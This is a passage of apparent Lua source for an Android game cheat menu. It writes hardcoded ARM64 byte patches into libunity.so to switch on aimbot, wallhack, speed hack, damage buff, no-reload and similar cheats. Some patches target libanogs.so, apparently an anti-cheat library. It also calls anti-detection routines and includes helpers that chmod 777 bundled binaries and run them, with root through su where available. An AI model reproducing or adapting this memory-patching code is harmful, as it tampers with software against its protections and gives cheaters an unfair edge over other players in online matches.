    aimbot.setText("AIMBOT ADJUSTABLE")
    aimbotAdjuster.setVisibility(View.GONE)
    HexPatches.MemoryPatch("libunity.so", 0xB3CB040, "hEB2BB96D")
    HexPatches.MemoryPatch("libunity.so", 0xB3CB044, "hE923016D")
    HexPatches.MemoryPatch("libunity.so", 0xB3CB048, "hF91300F9")
    HexPatches.MemoryPatch("libunity.so", 0x5DAEF04, "hEC0F1BFC")
    HexPatches.MemoryPatch("libunity.so", 0x5DAEF08, "hEBAB006D")
    HexPatches.MemoryPatch("libunity.so", 0x5DAEF0C, "hE9A3016D")
    idkcstmToast("AIMBOT: DEACTIVATED")
  end
end
]]
--[[
aimbot_seekbar.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FF00, PorterDuff.Mode.SRC_ATOP))
function aimbot_seekbar.OnCheckedChangeListener()
  if aimbot_seekbar.isChecked() then
    antiC4droid()--53
    idkcstmToast("AIMBOT: ACTIVATED")
    aimbotAdjuster.setVisibility(View.VISIBLE)
    aimbotAdjuster.setMin(10)
    aimbotAdjuster.setMax(100)
    aimbotAdjuster.setOnSeekBarChangeListener{
      onStopTrackingTouch=function()
        HexPatches.MemoryPatch("libunity.so", 0xB3CB040, "h40 00 00 1C")
        HexPatches.MemoryPatch("libunity.so", 0xB3CB044, "hC0 03 5F D6")
        HexPatches.MemoryPatch("libunity.so", 0xB3CB048, float_to_hex(aimbotAdjuster.Progress))
        HexPatches.MemoryPatch("libunity.so", 0x5DAEF04, "h40 00 00 1C")
        HexPatches.MemoryPatch("libunity.so", 0x5DAEF08, "hC0 03 5F D6")
        HexPatches.MemoryPatch("libunity.so", 0x5DAEF0C, float_to_hex(aimbotAdjuster.Progress))
        idkcstmToast("ᴀɪᴍʙᴏᴛ: ᵃᵈʲᵘˢᵗᵃᵇˡᵉ ᴛᴏ " .. aimbotAdjuster.Progress .. "%")
      end,
      onProgressChanged=function()
        aimbot_seekbar.setText("ᴀɪᴍʙᴏᴛ ᵃᵈʲᵘˢᵗᵃᵇˡᵉ ᴛᴏ ("..aimbotAdjuster.Progress.."%)")
      end}
   else
    aimbot_seekbar.setText("AIMBOT ADJUSTABLE")
    aimbotAdjuster.setVisibility(View.GONE)
    HexPatches.MemoryPatch("libunity.so", 0xB3CB040, "hEB2BB96D")
    HexPatches.MemoryPatch("libunity.so", 0xB3CB044, "hE923016D")
    HexPatches.MemoryPatch("libunity.so", 0xB3CB048, "hF91300F9")
    HexPatches.MemoryPatch("libunity.so", 0x5DAEF04, "hEC0F1BFC")
    HexPatches.MemoryPatch("libunity.so", 0x5DAEF08, "hEBAB006D")
    HexPatches.MemoryPatch("libunity.so", 0x5DAEF0C, "hE9A3016D")
    idkcstmToast("AIMBOT: DEACTIVATED")
  end
end
]]
if speed_seekbar then
  speed_seekbar.setOnSeekBarChangeListener{
    onProgressChanged=function(view, progress, fromUser)
      value = progress
      if speed_text then
        speed_text.setText("𝗦𝗣𝗘𝗘𝗗 𝗛𝗔𝗖𝗞 (" .. value .. "%)")
      end
    end,
    onStopTrackingTouch=function(view)
      local jumpStrength = value * 0.5
      local hexValue = floatToHexLE(jumpStrength)
      -- 0x908A688 is NOT in your list
      -- UPDATED: 0x908A95C → 0X5AE2904
      HexPatches.MemoryPatch("libunity.so", 0x908A688, "h40 00 00 1C C0 03 5F D6")
      HexPatches.MemoryPatch("libunity.so", 0x908A688 + 4, "hC0 03 5F D6 00 00 7A 44")
      HexPatches.MemoryPatch("libunity.so", 0x908A688 + 8, hexValue, 4)
      HexPatches.MemoryPatch("libunity.so", 0X5AE2904, "h40 00 00 1C C0 03 5F D6")
      HexPatches.MemoryPatch("libunity.so", 0X5AE2904 + 4, "hC0 03 5F D6 00 00 7A 44")
      HexPatches.MemoryPatch("libunity.so", 0X5AE2904 + 8, hexValue, 4)
      idkcstmToast("SPEED HACK: ADJUSTED TO " .. value .. "%")
      speakText("SPEED HACK ADJUSTED TO " .. value .. " percent")
    end
  }
end

red.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FF00, PorterDuff.Mode.SRC_ATOP))
function red.OnCheckedChangeListener()
  if red.isChecked() then
    antiC4droid()--53
    idkcstmToast("WALLHACK RED: ACTIVATED")
    redAdjuster.setVisibility(View.VISIBLE)
    redAdjuster.setMin(50.0)
    redAdjuster.setMax(999.0)
    redAdjuster.setOnSeekBarChangeListener{
      onStopTrackingTouch=function()
        HexPatches.MemoryPatch("libunity.so", 0x5DDB13C, "h20 00 80 D2 C0 03 5F D6")
        HexPatches.MemoryPatch("libunity.so", 0x4E5D954, "h40 00 00 1C C0 03 5F D6")
        HexPatches.MemoryPatch("libunity.so", 0x4E5D954 + 4, "hC0 03 5F D6 00 00 7A 44")
        HexPatches.MemoryPatch("libunity.so", 0x4E5D954 + 8, float_to_hex(redAdjuster.Progress))
        idkcstmToast("WALLHACK RED: ᵃᵈʲᵘˢᵗᵉᵈ ᵗᵒ " .. redAdjuster.Progress .. "%")
      end,
      onProgressChanged=function()
        red.setText("WALLHACK RED ᵃᵈʲᵘˢᵗᵉᵈ ᵗᵒ ("..redAdjuster.Progress.."%)")
      end}
  end
end

spector.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FFFF, PorterDuff.Mode.SRC_ATOP))
function spector.OnCheckedChangeListener()
  if spector.checked then
    HexPatches.MemoryPatch("libunity.so", 0x904DD18, "h0010201EC0035FD6")--NeedDelayProces
    HexPatches.MemoryPatch("libunity.so", 0x5aab16c, "h0010201EC0035FD6")--ProcessForDelay
    HexPatches.MemoryPatch("libunity.so", 0x96c5e88, "h0010201EC0035FD6")--	public override void Init(LuaBuild_ActorComponentBase actor)
    idkcstmToast("SPECTATE NO DELAY : ACTIVATED")

  end
end
damagehit.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FFFF, PorterDuff.Mode.SRC_ATOP))
function damagehit.OnCheckedChangeListener()
  if damagehit.checked then
    HexPatches.MemoryPatch("libunity.so", 0x95248C8, "h20 00 80 D2 C0 03 5F D6") -- GetNormalAttackBulletDamage() -- //  UPDATED 0x6e56528 -> 0x95248C8
    HexPatches.MemoryPatch("libunity.so", 0x6e594b0, "h20 00 80 D2 C0 03 5F D6") -- SetBulletDamage()
    HexPatches.MemoryPatch("libunity.so", 0x6e56f20, "h20 00 80 D2 C0 03 5F D6") -- get_CurBulletDamage()
    HexPatches.MemoryPatch("libunity.so", 0x6e56ff8, "h20 00 80 D2 C0 03 5F D6") -- get_ConfBulletDamage()
    idkcstmToast("BUFF DAMAGE: ACTIVATED ")
  end
end

walkair.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FFFF, PorterDuff.Mode.SRC_ATOP))
function walkair.OnCheckedChangeListener()
  if walkair.checked then

    HexPatches.MemoryPatch("libunity.so", 0x479941c, "h20 00 80 D2 C0 03 5F D6") -- IsGrounded = true (private)
    HexPatches.MemoryPatch("libunity.so", 0x5a0f110, "h20 00 80 D2 C0 03 5F D6") -- IsGrounded = true (public)
    HexPatches.MemoryPatch("libunity.so", 0xba57a9c, "h00 00 80 D2 C0 03 5F D6") -- SetGravity(Vector3.zero)
    idkcstmToast ("WALK AIR :ACTIVATED ")
   else
    HexPatches.MemoryPatch("libunity.so", 0x479941c, "hC0 03 5F D6 C0 03 5F D6") -- IsGrounded = true (private)
    HexPatches.MemoryPatch("libunity.so", 0x5a0f110, "hC0 03 5F D6 C0 03 5F D6") -- IsGrounded = true (public)
    HexPatches.MemoryPatch("libunity.so", 0xba57a9c, "hC0 03 5F D6 C0 03 5F D6") -- SetGravity(Vector3.zero)
    idkcstmToast("WALK AIR DEACTIVATED")
  end
end

noreload.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FFFF, PorterDuff.Mode.SRC_ATOP))
function noreload.OnCheckedChangeListener()
  if noreload.checked then
    HexPatches.MemoryPatch("libunity.so", 0xAF05F40, "h40 00 00 1C C0 03 5F D6")--public virtual float get_ChangeClipTime
    idkcstmToast("NO RELOAD: ACTIVATED")
   else
  end
end

fscope.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FFFF, PorterDuff.Mode.SRC_ATOP))
function fscope.OnCheckedChangeListener()
  if fscope.checked then

    antiC4droid()
    HexPatches.MemoryPatch("libunity.so", 0xB622988, "h00 2C 40 BC C0 03 5F D6")
    idkcstmToast("FAST SCOPE: ACTIVATED")
   else

  end
end

fastsw.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FFFF, PorterDuff.Mode.SRC_ATOP))
function fastsw.OnCheckedChangeListener()
  if fastsw.checked then
    antiC4droid()
    HexPatches.MemoryPatch("libunity.so", 0x86E7438, "h40 00 00 1C C0 03 5F D6") -- //  UPDATED 0xB6256A0 -> 0x86E7438
    idkcstmToast("FAST SWITCH: ACTIVATED")
   else
    HexPatches.MemoryPatch("libunity.so", 0x86E7438, "hE8 0F 1D FC F4 4F 01 A9") -- //  UPDATED 0xB6256A0 -> 0x86E7438
    idkcstmToast("FAST SWITCH: DEACTIVATED")
  end
end

fastsr.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FFFF, PorterDuff.Mode.SRC_ATOP))
function fastsr.OnCheckedChangeListener()
  if fastsr.checked then
    HexPatches.MemoryPatch("libunity.so", 0xa7a9f54, "h4000001CC0035FD6FFEB2F2D")
    HexPatches.MemoryPatch("libunity.so", 0xaec6244, "h4000001CC0035FD6FFEB2F2D")
    HexPatches.MemoryPatch("libunity.so", 0xaed8d74, "h4000001CC0035FD6FFEB2F2D")
    HexPatches.MemoryPatch("libunity.so", 0xa7aaed0, "h4000001CC0035FD6FFEB2F2D")
    idkcstmToast("FAST SHOOT SR: ACTIVATED")
  end
end

longslide.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FFFF, PorterDuff.Mode.SRC_ATOP))
function longslide.OnCheckedChangeListener()
  if longslide.checked then
    HexPatches.MemoryPatch("libunity.so", 0xA140F74, "h200080d2c0035fd6")
    idkcstmToast("LONG SLIDE: ACTIVATED")
   else
    HexPatches.MemoryPatch("libunity.so", 0xA140F74, "hE8 0F 1D FC F4 4F 01 A9")
    idkcstmToast("LONG SLIDE: DEACTIVATED")
  end
end

jump.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FFFF, PorterDuff.Mode.SRC_ATOP))
function jump.OnCheckedChangeListener()
  if jump.checked then
    HexPatches.MemoryPatch("libunity.so", 0x5b2f044, "h40 00 00 1C C0 03 5F D6")
    HexPatches.MemoryPatch("libunity.so", 0x654AEF4, "hC0 03 5F D6 00 00 20 41")
    idkcstmToast("HIGH JUMP: ACTIVATED")
   else
    HexPatches.MemoryPatch("libunity.so", 0x5b2f044, "hE8 0F 1D FC F4 4F 01 A9")
    HexPatches.MemoryPatch("libunity.so", 0x654AEF4, "hF4 4F 01 A9 FD 7B 02 A9")
    idkcstmToast("HIGH JUMP: DEACTIVATED")
  end
end

spect.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FFFF, PorterDuff.Mode.SRC_ATOP))
function spect.OnCheckedChangeListener()
  if spect.checked then
    HexPatches.MemoryPatch("libunity.so", 0x708e260, "h20 00 80 D2 C0 03 5F D6")
    idkcstmToast("SPECTATOR TAGS: ACTIVATED")
   else
    HexPatches.MemoryPatch("libunity.so", 0x708e260, "hF3 0F 1E F8 FD 7B 01 A9")
    idkcstmToast("SPECTATOR TAGS: DEACTIVATED")
  end
end

advance.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FFFF, PorterDuff.Mode.SRC_ATOP))
function advance.OnCheckedChangeListener()
  if advance.checked then
    HexPatches.MemoryPatch("libunity.so", 0x716d74c, "h20 00 80 D2 C0 03 5F D6")
    idkcstmToast("ADVANCE UAV: ACTIVATED")
   else
    HexPatches.MemoryPatch("libunity.so", 0x716d74c, "hFF 03 02 D1 F8 5F 04 A9")
    idkcstmToast("ADVANCE UAV: DEACTIVATED")
  end
end

long.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
function long.OnCheckedChangeListener()
  if long.checked then
    antiC4droid()
    -- ============================================================
    -- libunity.so - PATCHES (Fixed Closing)
    -- ============================================================

    HexPatches.MemoryPatch("libunity.so", 0x5942E68, "h20 00 80 D2 C0 03 5F D6"); -- CheckCanExecution -- //  UPDATED 0x66CD27C -> 0x5942E68
    HexPatches.MemoryPatch("libunity.so", 0x5947460, "h20 00 80 D2 C0 03 5F D6"); -- CheckTargetIsValid -- //  UPDATED 0x66D17C4 -> 0x5947460
    HexPatches.MemoryPatch("libunity.so", 0x5947C18, "h20 00 80 D2 C0 03 5F D6"); -- CheckTargetIsValid_ManualParameter -- //  UPDATED 0x66D1F74 -> 0x5947C18
    HexPatches.MemoryPatch("libunity.so", 0x5945AA8, "h20 00 80 D2 C0 03 5F D6"); -- CheckExecution_FindValidTarget -- //  UPDATED 0x66CFDFC -> 0x5945AA8
    HexPatches.MemoryPatch("libunity.so", 0x5942430, "h20 00 80 D2 C0 03 5F D6"); -- CheckCanExcution_Extra -- //  UPDATED 0x66CC8B4 -> 0x5942430
    HexPatches.MemoryPatch("libunity.so", 0x5945B5C, "h20 00 80 D2 C0 03 5F D6"); -- CheckExecution_ObstacleAround -- //  UPDATED 0x66CFEB0 -> 0x5945B5C
    HexPatches.MemoryPatch("libunity.so", 0x5948B0C, "h20 00 80 D2 C0 03 5F D6"); -- CalculateObstacleSide -- //  UPDATED 0x66D2E68 -> 0x5948B0C
    HexPatches.MemoryPatch("libunity.so", 0x5948F80, "h20 00 80 D2 C0 03 5F D6"); -- CalculateObstacleTop -- //  UPDATED 0x66D32DC -> 0x5948F80
    HexPatches.MemoryPatch("libunity.so", 0x5943BE0, "h20 00 80 D2 C0 03 5F D6"); -- RequestDoExecution -- //  UPDATED 0x66CE000 -> 0x5943BE0
    HexPatches.MemoryPatch("libunity.so", 0x5944258, "h20 00 80 D2 C0 03 5F D6"); -- StartExecution -- //  UPDATED 0x66CE678 -> 0x5944258
    HexPatches.MemoryPatch("libunity.so", 0x5944E68, "h20 00 80 D2 C0 03 5F D6"); -- OnStartExecution -- //  UPDATED 0x66CF28C -> 0x5944E68
    idkcstmToast("LONG EXECUTE ACITVATED")
   else
    HexPatches.MemoryPatch("libunity.so", 0x712fefc, "hC0 03 5F D6 C0 03 5F D6") -- CheckTargetIsValid_ManualParameter
    HexPatches.MemoryPatch("libunity.so", 0x721d66c, "hC0 03 5F D6 C0 03 5F D6") -- get_ExecutionID
    HexPatches.MemoryPatch("libunity.so", 0x5ac52fc, "hC0 03 5F D6 C0 03 5F D6")
    HexPatches.MemoryPatch("libunity.so", 0x8788dc0, "hC0 03 5F D6 C0 03 5F D6")
    HexPatches.MemoryPatch("libunity.so", 0x7de8ff0, "hC0 03 5F D6 C0 03 5F D6") -- fast_execute_1
    HexPatches.MemoryPatch("libunity.so", 0x7DE8FF8, "hC0 03 5F D6 C0 03 5F D6") -- fast_execute_2
    idkcstmToast("LONG EXECUTION DEACTIVATED")
  end
end
smoother.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FFFF, PorterDuff.Mode.SRC_ATOP))
function smoother.OnCheckedChangeListener()
  if smoother.checked then
    HexPatches.MemoryPatch("libunity.so", 0x5716188, "h002480D2C0035FD6"); -- get_IsHighEndDevice
    HexPatches.MemoryPatch("libunity.so", 0x572870C, "h200080D2C0035FD6"); -- set_EnableHDR
    HexPatches.MemoryPatch("libunity.so", 0x57286B0, "h200080D2C0035FD6"); -- get_EnableHDR
    HexPatches.MemoryPatch("libunity.so", 0x571AC14, "h200080D2C0035FD6"); -- IsHighMemoryDevice
    HexPatches.MemoryPatch("libunity.so", 0x57115E0, "h002480D2C0035FD6"); -- GetMaxFrameRateLevel
    HexPatches.MemoryPatch("libunity.so", 0x571CDCC, "h200080D2C0035FD6"); -- CanExceedOriginResolution
    HexPatches.MemoryPatch("libunity.so", 0x57119EC, "h200080D2C0035FD6"); -- get_EnableFramerateCustomize
    HexPatches.MemoryPatch("libunity.so", 0x5711C50, "h002480D2C0035FD6"); -- GetFrameRateValue
    HexPatches.MemoryPatch("libunity.so", 0x57222BC, "h002480D2C0035FD6"); -- GetFrameRateValue
    idkcstmToast("Ultra Pro Max Fps")
  end
end

-------------------------WIDE FOV ADJUSTABLE-----------------------------------------
-------------------------HEX TRUE = h4000001CC0035FD60000FA43----------------------------------
-------------------------1 OFFSET /RVA = 0x721feb0----------------------------------
-------------------------2 OFFSET /RVA = 0x7220188----------------------------------
--[[
widefov_seekbar.setOnSeekBarChangeListener{
  onProgressChanged=function(view, progress, fromUser)
    value = progress
    widefov_text.setText(" ᴡɪᴅᴇ ғᴏᴠ (" .. value .. "%)")
  end,

  onStopTrackingTouch=function(view)
    local Widefov = value * 1.0
    local hexValue = floatToHexLE(Widefov)

    HexPatches.MemoryPatch("libunity.so", 0x721feb0 , "h40 00 00 1C C0 03 5F D6")
    HexPatches.MemoryPatch("libunity.so", 0x721feb0 + 4, "hC0 03 5F D6 00 00 7A 44")
    HexPatches.MemoryPatch("libunity.so", 0x721feb0 + 8, hexValue, 4)
    HexPatches.MemoryPatch("libunity.so", 0x7220188, "h40 00 00 1C C0 03 5F D6")
    HexPatches.MemoryPatch("libunity.so", 0x7220188 + 4, "hC0 03 5F D6 00 00 7A 44")
    HexPatches.MemoryPatch("libunity.so", 0x7220188 + 8, hexValue, 4)
  end
}
]]

widefov_seekbar.setOnSeekBarChangeListener{
  onProgressChanged=function(view, progress, fromUser)
    value = progress
    widefov_text.setText("ᴡɪᴅᴇ ғᴏᴠ (" .. value .. "%)")

    -- FOV Range (Real-time Adjustment)
    local wideStrength = value * 1.0
    local hexValue = floatToHexLE(wideStrength)

    -- Multiple offsets example addresses burat ka talaga yinz
    local offsets = {0x55EBD28, 0x55EC784, 0x55ED544}
    for i, addr in ipairs(offsets) do
      HexPatches.MemoryPatch("libunity.so", addr, "h40 00 00 1C C0 03 5F D6")
      HexPatches.MemoryPatch("libunity.so", addr + 4, "hC0 03 5F D6 00 00 7A 44")
      HexPatches.MemoryPatch("libunity.so", addr + 8, hexValue, 4)
      idkcstmToast("ᴡɪᴅᴇ ғᴏᴠ : ".. value .. "%")
    end
  end
}


-------------------------WALLHACK RED ADJUSTABLE NA DI GAGANA TANGINA-----------------------------------------
-------------------------HEX TRUE = h4000001CC0035FD60000FA43----------------------------------
-------------------------1 OFFSET /RVA = 0x8187294----------------------------------
-------------------------2 OFFSET /RVA = 0x87871DE----------------------------------
red_seekbar.setOnSeekBarChangeListener{
  onProgressChanged=function(view, progress, fromUser)
    value = progress
    red_text.setText("ᴡᴀʟʟʜᴀᴄᴋ ʀᴇᴅ (" .. value .. "%)")
  end,

  onStopTrackingTouch=function(view)
    local redStrenght = value * 1.0
    local hexValue = floatToHexLE(redStrenght)

    HexPatches.MemoryPatch("libunity.so", 0x68E5FD0 , "h40 00 00 1C C0 03 5F D6")
    HexPatches.MemoryPatch("libunity.so", 0x68E5FD0 + 4, "hC0 03 5F D6 00 00 7A 44")
    HexPatches.MemoryPatch("libunity.so", 0x68E5FD0 + 8, hexValue, 4)
    HexPatches.MemoryPatch("libunity.so", 0x56466D4 , "h40 00 00 1C C0 03 5F D6")
    HexPatches.MemoryPatch("libunity.so", 0x56466D4 + 4, "hC0 03 5F D6 00 00 7A 44")
    HexPatches.MemoryPatch("libunity.so", 0x56466D4 + 8, hexValue, 4)
    HexPatches.MemoryPatch("libunity.so", 0x87871DE, "h40 00 00 1C C0 03 5F D6")
    HexPatches.MemoryPatch("libunity.so", 0x87871DE + 4, "hC0 03 5F D6 00 00 7A 44")
    HexPatches.MemoryPatch("libunity.so", 0x87871DE + 8, hexValue, 4)
    idkcstmToast("ᴡᴀʟʟʜᴀᴄᴋ ʀᴇᴅ : ".. value .. "%")
  end
}

jump_seekbar.setOnSeekBarChangeListener{
  onProgressChanged=function(view, progress, fromUser)
    value = progress
    jump_text.setText("ᴊᴜᴍᴘ (" .. value .. "%)")
  end,

  onStopTrackingTouch=function(view)
    local jumpStrength = value * 1.0
    local hexValue = floatToHexLE(jumpStrength)

    HexPatches.MemoryPatch("libunity.so", 0x654AEF0, "h40 00 00 1C", 4)
    HexPatches.MemoryPatch("libunity.so", 0x654AEF4, "hC0 03 5F D6", 4)
    HexPatches.MemoryPatch("libunity.so", 0x654AEF8, hexValue, 4)
    idkcstmToast("ʜɪɢʜ ᴊᴜᴍᴘ : ".. value .. "%")
  end
}





------------------------WALK UNDER WATER-----------------------------------------
-------------------------HEX TRUE = h4000001CC0035FD60000FA43----------------------------------
-------------------------1 OFFSET /RVA = 0x5ae2bc8----------------------------------
-------------------------2 OFFSET /RVA = 0x5aff6f4----------------------------------
-------------------------3 OFFSER /RVA = 0x87accac----------------------------------
walk.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
function walk.OnCheckedChangeListener()
  if walk.checked then
    HexPatches.MemoryPatch("libunity.so", 0x5ae2bc8, "h20 00 80 D2 C0 03 5F D6")
    HexPatches.MemoryPatch("libunity.so", 0x5aff6f4, "h20 00 80 D2 C0 03 5F D6")
    HexPatches.MemoryPatch("libunity.so", 0x87accac, "h20 00 80 D2 C0 03 5F D6")
    idkcstmToast("walk under water ✔️")
  end
end

function fastrev.OnCheckedChangeListener()
  if fastrev.checked then
    antihook()
    HexPatches.MemoryPatch("libunity.so", 0x8781EBD, "h00 80 3F")
    HexPatches.MemoryPatch("libunity.so", 0x5DE9FB0, "h00 00 80 3F") -- set_ReviveTime
    HexPatches.MemoryPatch("libunity.so", 0x5DEA074, "h20 00 80 D2") -- get_ReviveTime
    HexPatches.MemoryPatch("libunity.so", 0x5DEA07C, "h00 00 80 3F") -- get_ReviveTimeLeftSecond
    HexPatches.MemoryPatch("libunity.so", 0x5DEA138, "h20 00 80 D2 C0 03 5F D6") -- get_ReviveProgress
    idkcstmToast("Fast Revive: ACTIVATED")
   else
  end
end

function smooth.OnCheckedChangeListener()
  if smooth.checked then
    antiC4droid()
    HexPatches.MemoryPatch("libunity.so", 0xA9A2D04, "h20 00 80 D2 C0 03 5F D6") -- get_EnableVRS
    HexPatches.MemoryPatch("libunity.so", 0xA9A2DD8, "h20 00 80 D2 C0 03 5F D6") -- get_EnableVariableRateShading
    HexPatches.MemoryPatch("libunity.so", 0xA9A33D4, "h20 00 80 D2 C0 03 5F D6") -- get_EnableMSAA
    HexPatches.MemoryPatch("libunity.so", 0xA993508, "h20 00 80 D2 C0 03 5F D6") -- get_IsExtremeDevice
    HexPatches.MemoryPatch("libunity.so", 0xA9937A0, "h00 24 80 D2 C0 03 5F D6") -- get_UltraFrameRate
    HexPatches.MemoryPatch("libunity.so", 0xA9937A8, "h00 24 80 D2 C0 03 5F D6") -- get_UltraFrameRateBR
    HexPatches.MemoryPatch("libunity.so", 0xA99D9E0, "h20 00 80 D2 C0 03 5F D6") -- IsHighMemoryDevice
    HexPatches.MemoryPatch("libunity.so", 0xA99FBAC, "h20 00 80 D2 C0 03 5F D6") -- CanExceedOriginResolution
    HexPatches.MemoryPatch("libunity.so", 0xA9A0914, "h20 00 80 D2 C0 03 5F D6") -- GetSuperResolutionScale
    HexPatches.MemoryPatch("libunity.so", 0xA9925F4, "h20 00 80 D2 C0 03 5F D6") -- SetUltraFrameRateDeviceInfo
    HexPatches.MemoryPatch("libunity.so", 0xA9A5274, "h20 00 80 D2 C0 03 5F D6") -- IsFramerateCustomizeAvailable
    HexPatches.MemoryPatch("libunity.so", 0xA99219C, "h20 00 80 D2 C0 03 5F D6") -- get_IsUltraFrameRateCustomized
    HexPatches.MemoryPatch("libunity.so", 0xA9921A4, "h00 24 80 D2 C0 03 5F D6") -- GetMaxSupportedFrameRateLevel
    HexPatches.MemoryPatch("libunity.so", 0xa6c3e24, "h00 24 80 D2 C0 03 5F D6") -- GetFramerateCustomizationMax
    HexPatches.MemoryPatch("libunity.so", 0xA993590, "h00 24 80 D2 C0 03 5F D6") -- GetMaxFrameRateLevel
    HexPatches.MemoryPatch("libunity.so", 0xA993C10, "h00 24 80 D2 C0 03 5F D6") -- GetFrameRateValue
    HexPatches.MemoryPatch("libunity.so", 0xA993644, "hC0 00 80 D2 C0 03 5F D6") -- GetMaxSupportedFrameRateLevelForDevice
    idkcstmToast("FRAMERATE FPS: ACTIVATED")
   else
  end
end


unlock.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16C3D4, PorterDuff.Mode.SRC_ATOP))
function unlock.OnCheckedChangeListener()

  if unlock.checked then
    antiC4droid()



    HexPatches.MemoryPatch("libanogs.so", 0xA993590, "h200080D2C0035FD6");
    HexPatches.MemoryPatch("libanogs.so", 0xA9951E0, "h200080D2C0035FD6");
    HexPatches.MemoryPatch("libanogs.so", 0xA9937B0, "h200080D2C0035FD6");
    HexPatches.MemoryPatch("libanogs.so", 0xA9937A8, "h002480D2C0035FD6");
    HexPatches.MemoryPatch("libanogs.so", 0xA9936B8, "h200080D2C0035FD6");
    HexPatches.MemoryPatch("libanogs.so", 0xA993644, "h200080D2C0035FD6");
    HexPatches.MemoryPatch("libanogs.so", 0xA9921A4, "h200080D2C0035FD6");
    HexPatches.MemoryPatch("libanogs.so", 0xA99219C, "h200080D2C0035FD6");
    idkcstmToast("UNLOCK ALL GRAPHICS ✔️")
   else
  end
end


diveb_seekbar.setOnSeekBarChangeListener{
  onProgressChanged=function(view, progress, fromUser)
    value = progress
    diveb_text.setText("ᴅɪᴠᴇ ʙᴏᴏꜱᴛ (" .. value .. "%)")
  end,

  onStopTrackingTouch=function(view)
    local diveStrength = value * 1.0
    local hexValue = floatToHexLE(diveStrength)

    HexPatches.MemoryPatch("libunity.so", 0x8461224, "h40 00 00 1C C0 03 5F D6")
    HexPatches.MemoryPatch("libunity.so", 0x8461224 + 4, "hC0 03 5F D6 00 00 7A 44")
    HexPatches.MemoryPatch("libunity.so", 0x8461224 + 8, hexValue, 4)
    HexPatches.MemoryPatch("libunity.so", 0x8461288, "h40 00 00 1C C0 03 5F D6")
    HexPatches.MemoryPatch("libunity.so", 0x8461288 + 4, "hC0 03 5F D6 00 00 7A 44")
    HexPatches.MemoryPatch("libunity.so", 0x8461288 + 8, hexValue, 4)
    idkcstmToast("DIVE BOOST: ᵃᵈʲᵘˢᵗᵉᵈ ᵗᵒ " .. value .. "%")
  end
}
--[[
blueprint.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FFFF, PorterDuff.Mode.SRC_ATOP))
function blueprint.OnCheckedChangeListener()
  if blueprint.checked then
    HexPatches.MemoryPatch("libunity.so", 0xAC93FAC, "h200080D2C0035FD6")
    HexPatches.MemoryPatch("libunity.so", 0xACA0258, "h200080D2C0035FD6")
    idkcstmToast("HIGH JUMP: ACTIVATED")
   else
    HexPatches.MemoryPatch("libunity.so", 0xAC93FAC, "h000080D2C0035FD6")
    HexPatches.MemoryPatch("libunity.so", 0xACA0258, "h000080D2C0035FD6")
    idkcstmToast("HIGH JUMP: DEACTIVATED")
  end
end
]]
redhack.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FFFF, PorterDuff.Mode.SRC_ATOP))
function redhack.OnCheckedChangeListener()
  if redhack.checked then
    HexPatches.MemoryPatch("libunity.so", 0x56466CC, "h20 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libunity.so", 0x56466D4, "h20 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libunity.so", 0xA370CD4, "h20 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libunity.so", 0x56466CC, "h20 00 80 D2 C0 03 5F D6", 32);
    HexPatches.MemoryPatch("libunity.so", 0x68E5FD0, "h40 00 00 1C C0 03 5F D6", 32);
    idkcstmToast("ᴡᴀʟʟʜᴀᴄᴋ ʀᴇᴅ ᴀᴄᴛɪᴠᴀᴛᴇᴅ")
   else
  end
end
kinetic.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FFFF, PorterDuff.Mode.SRC_ATOP))
function kinetic.OnCheckedChangeListener()
  if kinetic.checked then
    HexPatches.MemoryPatch("libunity.so", 0x5ac5864, "h20 00 80 D2 C0 03 5F D6")
    idkcstmToast("kinectic gun armor")
   else
  end
end


function cppPatch(A0_37, A0_38)
  local path = activity.getLuaDir("Res/" .. A0_37)
  os.execute("chmod 777 " .. path .. " " .. A0_38 .. " 2" .. " 3" .. " 4" .. " ‎ ")
  Runtime.getRuntime().exec(path .. " " .. A0_38 .. " 2" .. " 3" .. " 4" .. " ‎ ")
end

import "java.io.File"
if os.execute("su") then
  function patch(路径一, Arg2)

    调用路径一=activity.getLuaDir(路径一)
    os.execute("su -c chmod 777 "..调用路径一)
    Runtime.getRuntime().exec("su -c "..调用路径一)
    os.execute("su -c rmdir "..activity.getLuaDir("lib/*"))
    Toast.makeText(activity, Arg2,Toast.LENGTH_SHORT).show()
  end
 else

  function patch(路径一, Arg2)

    调用路径一= activity.getLuaDir(路径一)
    os.execute("chmod 777 " .. 调用路径一)
    Runtime.getRuntime().exec("" ..调用路径一)
    os.execute(" rmdir "..activity.getLuaDir("lib/*"))
    Toast.makeText(activity, Arg2,Toast.LENGTH_SHORT).show()
  end
end

--[[
ak117.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function ak117.OnCheckedChangeListener()
  if ak117.checked then
    patch("Res/pogiako2 90998")
    idkcstmToast("ᴀᴋ𝟷𝟷𝟽 - ᴍᴇᴍᴇɴᴛᴏ ᴍᴏʀɪ ᴀᴄᴛɪᴠᴀᴛᴇ")
  end
end

